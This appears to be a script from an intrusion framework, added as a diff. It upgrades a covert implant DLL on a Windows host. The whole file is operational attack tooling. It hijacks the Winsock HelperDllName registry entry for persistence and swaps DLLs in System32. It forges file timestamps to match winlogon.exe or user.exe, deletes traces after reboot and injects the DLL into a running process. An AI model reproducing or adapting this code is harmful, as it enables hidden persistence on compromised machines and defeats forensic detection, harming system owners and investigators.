@@ -1,0 +1,200 @@
+
+@include "_Paths.dsi";
+@include "_Processes.dsi";
+@include "_Versions.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+@disablewow64 on;
+
+if ($argc != 3)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0] <localFile> <procName>");
+	return false;
+}
+
+string $localFile = $argv[1];
+string $procName = $argv[2];
+
+string $arch;
+_GetArch($arch);
+
+string $regKey		= "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Winsock";
+string $regKeyValue	= "HelperDllName";
+string $defaultPath	= "\%\%SystemRoot\%\%\\System32";
+
+# get install name and path
+string $payloadPath			= $defaultPath;
+string $payloadName			= "wship.dll";
+string $payloadLoadPath		= $defaultPath;
+string $payloadLoadName		= "wship4.dll";
+string $payloadDeletePath	= $defaultPath;
+string $payloadDeleteName	= "wship6x.dll";
+if (!GetInput("PC DLL install path", $payloadPath, $payloadPath) ||
+	!GetInput("PC DLL install name", $payloadName, $payloadName) ||
+	!GetInput("PC DLL temporary (to load) path", $payloadLoadPath, $payloadLoadPath) ||
+	!GetInput("PC DLL temporary (to load) name", $payloadLoadName, $payloadLoadName) ||
+	!GetInput("PC DLL temporary (to delete) path", $payloadDeletePath, $payloadDeletePath) ||
+	!GetInput("PC DLL temporary (to delete) name", $payloadDeleteName, $payloadDeleteName))
+{
+	echo("* Failed to get PC names and paths", ERROR);
+	return false;
+}
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# get the HelperDllName value
+string $origKeyValue;
+if (!_GetRegistryValue("L", 
+					   $regKey,
+					   $regKeyValue,
+					   $origKeyValue) || !defined($origKeyValue))
+{
+	$origKeyValue = "";
+}
+
+if ($origKeyValue != "$payloadPath\\$payloadName")
+{
+	echo("* Failed to find $payloadPath\\$payloadName in $regKeyValue key", ERROR);
+	return false;
+}
+
+# get the process id for injection
+int $id;
+if (prompt("Do you want to perform injection (for instant-grat)?"))
+{
+	if (StrLen($procName) > 0)
+	{
+		if (!_FindProcessOnList($procName, $id) || !defined($id))
+		{
+			echo("* Failed to find $procName", ERROR);
+		}
+	}
+
+	# make sure the user wants to keep going if we don't have a process
+	if (!defined($id))
+	{
+		echo("No process for injection", ERROR);
+		if (!prompt("Continue?"))
+		{
+			return false;
+		}
+	}
+}
+
+string $usePath = $payloadPath;
+if ($usePath == $defaultPath)
+{
+	$usePath = $sysPath;
+}
+string $useLoadPath = $payloadLoadPath;
+if ($useLoadPath == $defaultPath)
+{
+	$useLoadPath = $sysPath;
+}
+string $useDeletePath = $payloadDeletePath;
+if ($useDeletePath == $defaultPath)
+{
+	$useDeletePath = $sysPath;
+}
+
+# upload the new file
+echo "Uploading new PC";
+if (!`put "$localFile" -name "$useLoadPath\\$payloadLoadName" -permanent`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# move the old file
+echo "Moving old PC";
+if (!`move "$usePath\\$payloadName" "$useDeletePath\\$payloadDeleteName"`)
+{
+	echo("    FAILED", ERROR);
+	echo "Performing recovery";
+	if (!`delete -file "$useLoadPath\\$payloadLoadName"`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    RECOVERED", GOOD);
+	}
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# copy the new file to it's final location
+echo "Copying new PC to permanent location";
+if (!`copy "$useLoadPath\\$payloadLoadName" "$usePath\\$payloadName"`)
+{
+	echo("    FAILED", ERROR);
+	echo "Performing recovery";
+	if (!`move "$useDeletePath\\$payloadDeleteName" "$usePath\\$payloadName"` ||
+		!`delete -file "$useLoadPath\\$payloadLoadName"`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    RECOVERED", GOOD);
+	}
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# matchtimes on the files
+string $matchName = "user.exe";
+if ($arch == "x64")
+{
+	$matchName = "winlogon.exe";
+}
+echo "Matching filetimes with $matchName";
+if (!`matchfiletimes -src "$sysPath\\$matchName" -dst "$usePath\\$payloadName"` ||
+	!`matchfiletimes -src "$sysPath\\$matchName" -dst "$useLoadPath\\$payloadLoadName"` ||
+	!`matchfiletimes -src "$sysPath\\$matchName" -dst "$useDeletePath\\$payloadDeleteName"`)
+{
+	echo("    FAILED", WARNING);
+	pause;
+	# continue...
+}
+else
+{
+	echo("    FINISHED", GOOD);
+}
+
+# mark the temp files for deletion
+`delete -file "$useLoadPath\\$payloadLoadName" -afterreboot`;
+`delete -file "$useDeletePath\\$payloadDeleteName" -afterreboot`;
+
+if (defined($id))
+{
+	# inject the DLL
+	echo "Injecting DLL";
+	if (!`injectdll -library $payloadLoadName -id $id`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    INJECTED", GOOD);
+	}
+}
+
+echo "Upgrade Finished";
+echo "$regKeyValue : '$origKeyValue'";
+
+pause;
+return true;
+
